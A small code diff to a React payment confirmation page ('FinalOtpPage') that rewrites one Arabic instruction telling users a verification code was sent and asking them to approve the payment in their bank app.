@@ -159,7 +159,7 @@ export default function FinalOtpPage() {
             </div>
             <div className="space-y-3">
               <p className="text-xl font-bold leading-relaxed text-white">
-                الرجاء الدخول لتطبيق البنك الخاص بك والموافقة
+                تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك والموافقة على العملية لإتمام الدفع.
               </p>
               <div className="flex items-center justify-center gap-2">
                 <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "0ms" }} />
